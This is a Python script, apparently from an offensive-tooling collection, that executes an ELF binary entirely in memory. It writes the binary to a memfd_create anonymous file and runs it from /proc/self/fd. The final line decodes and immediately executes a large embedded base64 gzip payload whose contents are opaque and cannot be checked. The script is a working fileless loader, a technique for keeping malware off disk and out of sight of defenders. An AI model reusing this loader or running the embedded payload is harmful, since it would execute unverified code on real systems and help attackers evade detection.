#!/usr/bin/env python

# In-Memory-Only ELF Execution (Without tmpfs)
# https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html

import base64
import ctypes 
import os
import zlib

MEMFD_CREATE = 319
MFD_CLOEXEC = 1

def run(elf):

    # Get syscall function
    libc = ctypes.CDLL(None)
    syscall = libc.syscall

    # Create anon fd
    anon_fd = syscall(MEMFD_CREATE, "", MFD_CLOEXEC)
    anon_path = "/proc/self/fd/%d" % anon_fd

    # Write elf binary to anon_fd and execute
    os.write(anon_fd, elf)
    os.execv(anon_path, ["suspicious"])

def run_compressed(elf_gz_b64):

    # Decompress - zlib.MAX_WBITS|16 needed for data compressed with gzip command
    elf = zlib.decompress(base64.b64decode(elf_gz_b64), zlib.MAX_WBITS|16)
    run(elf)

run_compressed("H4sIAEpSaFsAA+1bb0wcxxWfvePgCHg5bFNj7NTn1JZwa47DCQSSEHPHv6U9MLUhf9rg9cIt3LX3x7rbS8BtVRqSKKcENx+aqF/6pVUkR6rUf6qUSlVjBLKUD63iqlUttZaohSUSOcpFbi2njdnO7M5bdub24vRTI3WfdPvb9+a9NzNvZpcZdt53B2NDHkFAQF70KCLceMDk+6j8TI+lgmXdqA5fP4/uRdWYr7Lp8ZjwsOi36jHtLlA5j/sRi4INq1BlOuNjEQW27Xw2nserAot2O6O+IJVz+ITAot2OxGazzeQ3e1mUaD/HPaydh9rdpna3e1lcF1iEeFbR3xr1x+MAYhFiOH5di5P73bQ/PD6CWAS7r2K7avTpCcJ9ktZXKS7NHhYhrO2p5HTXA+2peFsqmSnMt813d7V1PRDKZ0PHjDYFqO7w2KShT+YXhNboH5WR8q/cWfy48Vp26HdTp149/9Dmjf1vbjRB3GHcEPqecYU+Xlb/kP6k/pHmBx3kdfi300F+oIL8yQp+EhXkpN/3OTUIx2uGhKcLnS1oeSTLM/OKPJvMKKnkORWzpFzOa0pOk9NKMoOGYyPRfvlY6FioE8kjE6NyXM2pc8m8puYmRvtT2Yw6oUyniOVcOpuhlrKp6qhIyEPHwIPjKhixhXlQaEnWEnkH5WH8YT6HG00scfISddDax8qBv3LcRBhLoHWb3GuTb9rk9vdKySb32eS3bXL7/G+m9deg7XnnkksuueSSSy655JJLnzWSlm74pZd8V9vx7fMXNY/+jrS05l+1yvXOa7hIP7yBrw0H+vAd4cluBL27rmM6/EvMz74C+h3vjxQvn5aK16SljdL4RGzZ9w28DJeWd9wklS33rhCfTbPY5h8NBwYM0Ruk7mXfjwn03NaacHMepc2p1dcbDiwSv6sUsf6Cod+ZI3BkS1rZ8krFkrSyeVwSLkmXt7Td2EETdeDX12eNesB+sbcHF6FC+6S01HsrRDwWr2v10ku9Le1kV4p7tJnAl0u+RswLU6tc/e9+CxdOYhscuEDxOx9LxUIJt+k3IjZe39L1N4nS26u40ueMeEQejzw2UvxLZDKCY3H46aMITUrLbQRPRYp3Roq3YkeuG2Owcse7mcUOpOff14IdfwX7WPFfseKtgeIHEX3336SlVUHquVp4j4zR16ciT0WmIqcj8ursbAj0b67SMWVG0SWXXHLJJZdccskll1xyyaX/dxKQB0lqKpUNPp7NpeIHDdk+78PdyPy+VV/SdbKzPIrxpxgfwTiB8eCHur6GMYZxA+NvMR4VzO+sho9zJ5EwHxD21df4XxFqAkROvuWvf6DrX7LV76yP0CGqv4j1g0RBDAyJzV9uqHvGv4iOtzz8xfsP3Qf25Jv2PNbz2/wS26fwbxK311CMiIEXPP07qqdwBdTm2/h3Bpcb3yqjYuD7nqjYfN47KAaXq6Ji68s+SQy/UC2J3Us1o2JfTuyOiOGI2BoVg1gP60dFv/E9k8ThRezH/e7nkksuueSSSy655JJLLn0WyDpPaTufbMd6UKTlOyj7J2q3l/JwTnMf5WHP1UIRzmvu58r/uaVnDZ4evoQzlVcoD2cpw5S/h/LPUqyj2EyxCbFknensMwH2YqAP+8wainsoSj5W/mIV2+6LFGs5f//Wzf6A6hblE9RepzzEt0T5r9HyjyhvP4v6vyA4V85TV4Dl4XztcH//Q8HWAXU6qWSC3aGOULit49gR8+5udXlxNC44bJK9eLTWHOVetOEor7LmESv3WfOHlVdb84yV11jjwcr91jiy8lprfrDye6x5xMrrtg88M/J6FHSU70B9jnLRysdg5Q3W88nKA46Hxb2o0TrXz8p3onFH+S7reWflu63nnJU3Oc4nL/qcdS6ble/ZThRh5M0o6Cjfi8KO8pYymZm38aHOy8l7zoPjucjFU6Tyn3Pyg1Re4uQPGnVstwee8yHjvjw+aeonzI3XgqFfHucfVmh/pX69bpTtRBMH+RJn/V8Z111l7Vwz/JSP4++pPt/OdeNaPq9uGn7Kx7dWIHkPInqHxgEe772Cc35D1pCXz4dOwTl/Ylggj1xz2TzZZeiXPy9jFfykqR++3nMV2lnE8kZPs/WeBHqNyG3PI7w+XqdxOEPbo1L5W4jUuxd1c37yVB/eA/A/1F8Lpj7f3xWq30n9Q47IJdpOXv+PFfp1Q3DOL/mZ4d/h/TaT0/JaYXY2NIO2M0hkLS3PkNQQkogSz8pzqey0kpLjWjaXl5XCPJrJps+mVE2Nhx68v7vHWYlkryRlJZdTFmQ1o+UW0GxOSatyvJBOL2ATGydjTY1RTZD/cT9D/sWNGybLQycjo4Py4NgASWFhteNIHnhyLDI60s+WGBkvWDQ8NikPStSDNHASycOxE9FITD4xNHRqcEKeiERjgzJk2MzkC0a7PzGnhmTo9PUxGThqXNGU8jQdTksmWlbL2MQcOZ7PygklEydJOyMncEE8mZELeTVubxvpIOan83nqxkgGkmXcPghPxQwfNqeIbRoK5RfSmjKNUcuZmIC7ZAZ7OotCmaymhiLRkTZNmaPcXKYQmi4kU/G2ZBwZXELJJ1AovpDB/kzUcmbJ02oun8xmGEbGZTk1pRBFenc2pZEqcTfJbWgui280dR5fjXEJ5bJGqENqgs6gRDy3zZmm5hQwLeAe16CkkzOIeDQrMf3gUKIQns9pPPEcHpz/ksg6m7zz4T1ZKU8SSOD4LyA2J4nPCwxy+vzypoOzh/UY4KG72JPvLLfwWhfsYd0GCPawfLJ/wyE0hsy1P9jD+g7wApVDvhfYwzr9McTmAsI6EBD2F0B8/E4jcy0P9rBeBBS59ns4/CYy9wbAw7oSMFih/UDnkBlTsIf1J+BFrn6+/89R+yjlYZ0KCHqE3eNgfx7ZcyJRWd4s7KOA+PEvcvaw7rWQ0+fTc3/A2cP6GJCPl5/DH3H28PcT8FluwPk/Zz/h7GH9AFjL6fP9fwOxzy+fP8wv33n7X3D2lfJzK9m/xdnDOh/Qz/Wfj+fbyJzjsH2y8nXbnPX5+P8Z/xps9rDeLH1K+78jNmfTyoem9pAHXc3ZwTiSdbRgs4d9yJV2E1vvUv97nL21nqW73eBd7G9y9rCeDIbZdvL2QB9RGdjDui0cdtbn319bVMZvzsH+3gr2dnT6rj0ODmngyd+ho6j8/VFraztj32Win3POt7+xgv0T3SbWcAa8/X8APNGBDuBAAAA=")
